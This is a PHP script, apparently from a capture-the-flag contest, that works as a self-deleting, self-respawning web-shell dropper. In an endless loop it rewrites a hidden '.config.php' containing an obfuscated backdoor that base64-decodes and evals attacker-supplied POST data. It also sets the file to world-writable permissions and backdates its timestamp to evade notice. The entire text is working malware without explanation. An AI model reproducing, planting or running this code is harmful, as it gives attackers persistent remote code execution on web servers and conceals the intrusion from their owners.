<?php
    set_time_limit(0);
    ignore_user_abort(1);
    unlink(__FILE__);
    //file_put_contents(__FILE__,'');
    while(1){
        file_put_contents('C:\phpStudy\WWW\ctf\.config.php','<?php $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s22=${strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2])}[\'n985de9\'];if(isset($s22)){eval($s21($s22));}?>');
        system('chmod 777 .config.php');
        touch(".config.php",mktime(20,15,1,11,28,2016));
        usleep(100);
    }
?>